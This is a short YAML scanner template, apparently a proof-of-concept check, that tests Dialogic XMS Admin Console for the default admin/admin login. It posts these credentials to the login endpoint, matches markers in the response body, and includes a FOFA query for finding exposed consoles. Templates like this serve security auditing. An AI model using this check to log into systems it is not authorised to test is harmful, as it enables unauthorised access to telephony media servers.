id: poc-yaml-dialogic-xms-admin-console-weak-password
info:
  name: Dialogic XMS管理控制台 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: dialogic_xms_admin_console
  fofa: title="Dialogic XMS Admin Console"
requests:
- method: POST
  path: /index.php/verifyLogin/login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: usernameId=admin&passwordId=admin
  expression: status_code == 200 && contains(body,"DialogicDojo") && contains(body,"userId\">user:")
    && contains(body,"var downloads") && contains(body,"onclick=\"logout")
variables: {}
transport: http
